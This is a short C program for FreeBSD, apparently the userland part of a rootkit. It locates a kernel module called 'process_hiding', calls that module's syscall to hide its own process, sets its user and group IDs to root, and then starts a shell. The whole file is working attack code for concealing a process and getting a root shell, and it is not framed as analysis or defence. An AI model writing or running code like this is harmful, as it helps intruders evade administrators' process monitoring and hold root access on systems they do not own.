
// Create a module to elevate privileges and spawn a bash shell
// Make sure to hide myself.
// If message "Bad system call" is displayed it means that process_hiding module was not loaded!

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/module.h>
#include <sys/types.h>
// #include <sys/sysproto.h>


int
main(int argc, char *argv[]){
  int syscall_num;
  struct module_stat stat;

  stat.version = sizeof(stat);
  modstat(modfind("sys/process_hiding"), &stat);
  syscall_num = stat.data.intval;

  //pass in the syscall for process_hiding and the pid for itself
  printf("Hiding self (%d)..\n", getpid());

  syscall(syscall_num, getpid()); //hide self

  printf("Spawning shell..\n");

  //elevation
  setgid(0);
  setuid(0);

  //spawn shell
  //https://www.freebsd.org/cgi/man.cgi?query=exec&sektion=3&manpath=freebsd-release-ports
  execl("/bin/sh", "sh", NULL);

  // if we dont return then program crashes on execution
  return 0;
}
